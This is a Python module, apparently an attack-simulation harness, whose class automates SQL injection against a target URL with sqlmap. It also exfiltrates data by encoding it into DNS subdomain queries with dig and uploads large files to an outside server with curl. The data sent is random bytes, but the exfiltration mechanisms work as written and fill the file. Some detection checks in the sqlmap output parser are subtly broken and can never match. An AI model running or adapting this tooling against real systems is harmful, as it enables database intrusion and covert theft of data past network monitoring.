import subprocess
import time
import secrets
from datetime import datetime, timezone
from typing import Dict, List
import logging

logger = logging.getLogger(__name__)


class AttackOrchestrator:
    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip('/')
        self.logger = logging.getLogger(f"{__name__}.{self.__class__.__name__}")
    
    def execute_sqli_attack(self, endpoint: str, parameter: str, 
                           payload: str, technique: str) -> Dict:
        start_time = datetime.now(timezone.utc)
        full_url = f"{self.target_url}{endpoint}"
        self.logger.info(f"Starting SQLi attack: {technique} on {endpoint}")
        self.logger.info(f"Attack timestamp: {start_time.isoformat()}")
        try:
            cmd = ['sqlmap', '-u', full_url, '-p', parameter, '--batch',
                   '--level=3', '--risk=2', f'--technique={technique}',
                   '--time-sec=5', '--timeout=30', '--retries=2']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            end_time = datetime.now(timezone.utc)
            duration = (end_time - start_time).total_seconds()
            success = self._parse_sqlmap_output(result.stdout)
            
            return {
                'attack_type': 'SQL_Injection',
                'technique': technique,
                'endpoint': endpoint,
                'parameter': parameter,
                'payload': payload,
                'start_time': start_time.isoformat(),
                'end_time': end_time.isoformat(),
                'duration_seconds': duration,
                'success': success,
                'sqlmap_output': result.stdout[:500]
            }
        except subprocess.TimeoutExpired:
            self.logger.error(f"SQLi attack timed out after 300 seconds")
            return {
                'attack_type': 'SQL_Injection',
                'start_time': start_time.isoformat(),
                'success': False,
                'error': 'Timeout'
            }
        except Exception as e:
            self.logger.error(f"SQLi attack failed: {str(e)}")
            return {
                'attack_type': 'SQL_Injection',
                'start_time': start_time.isoformat(),
                'success': False,
                'error': str(e)
            }
    
    def execute_dns_exfiltration(self, domain: str, data_size_kb: int, 
                                throttle_qps: int) -> Dict:
        start_time = datetime.now(timezone.utc)
        self.logger.info(f"Starting DNS exfiltration: {data_size_kb}KB via {domain}")
        self.logger.info(f"Throttle rate: {throttle_qps} queries/sec")
        try:
            payload_size = data_size_kb * 1024
            payload = self._generate_payload(payload_size)
            bytes_per_query = 63
            chunks = self._chunk_data(payload, bytes_per_query)
            delay_between_queries = 1.0 / throttle_qps
            queries_sent = 0
            for chunk in chunks:
                query_domain = f"{chunk.hex()}.{domain}"
                
                try:
                    subprocess.run(
                        ['dig', '+short', query_domain],
                        capture_output=True,
                        timeout=5
                    )
                    queries_sent += 1
                    time.sleep(delay_between_queries)
                    
                except Exception as e:
                    self.logger.warning(f"DNS query failed: {e}")
                    continue
            
            end_time = datetime.now(timezone.utc)
            duration = (end_time - start_time).total_seconds()
            return {
                'attack_type': 'DNS_Exfiltration',
                'domain': domain,
                'start_time': start_time.isoformat(),
                'end_time': end_time.isoformat(),
                'duration_seconds': duration,
                'data_size_kb': data_size_kb,
                'throttle_qps': throttle_qps,
                'queries_sent': queries_sent,
                'success': True
            }
        except Exception as e:
            self.logger.error(f"DNS exfiltration failed: {str(e)}")
            return {
                'attack_type': 'DNS_Exfiltration',
                'start_time': start_time.isoformat(),
                'success': False,
                'error': str(e)
            }
    
    def execute_large_transfer(self, target_server: str, 
                              transfer_size_gb: int) -> Dict:
        start_time = datetime.now(timezone.utc)
        self.logger.info(f"Starting large transfer: {transfer_size_gb}GB to {target_server}")
        try:
            file_size_bytes = transfer_size_gb * 1024 * 1024 * 1024
            timestamp = start_time.timestamp()
            temp_file = f"/tmp/exfil_data_{timestamp}.bin"
            with open(temp_file, 'wb') as f:
                remaining = file_size_bytes
                chunk_size = 1024 * 1024
                while remaining > 0:
                    write_size = min(chunk_size, remaining)
                    f.write(secrets.token_bytes(write_size))
                    remaining -= write_size
            result = subprocess.run(['curl', '-X', 'POST', '-F', f'file=@{temp_file}', target_server],
                                    capture_output=True, timeout=3600)
            end_time = datetime.now(timezone.utc)
            duration = (end_time - start_time).total_seconds()
            subprocess.run(['rm', temp_file])
            
            return {
                'attack_type': 'Large_Transfer',
                'target_server': target_server,
                'start_time': start_time.isoformat(),
                'end_time': end_time.isoformat(),
                'duration_seconds': duration,
                'transfer_size_gb': transfer_size_gb,
                'success': result.returncode == 0
            }
            
        except Exception as e:
            self.logger.error(f"Large transfer failed: {str(e)}")
            return {
                'attack_type': 'Large_Transfer',
                'start_time': start_time.isoformat(),
                'success': False,
                'error': str(e)
            }
    
    def _parse_sqlmap_output(self, output: str) -> bool:
        success_indicators = [
            'vulnerable',
            'injected',
            'payload:',
            'Type: boolean-based blind',
            'Type: error-based',
            'Type: time-based blind',
            'Type: UNION query'
        ]
        
        output_lower = output.lower()
        return any(indicator in output_lower for indicator in success_indicators)
    
    def _generate_payload(self, size_bytes: int) -> bytes:
        return secrets.token_bytes(size_bytes)
    
    def _chunk_data(self, data: bytes, chunk_size: int) -> List[bytes]:
        return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
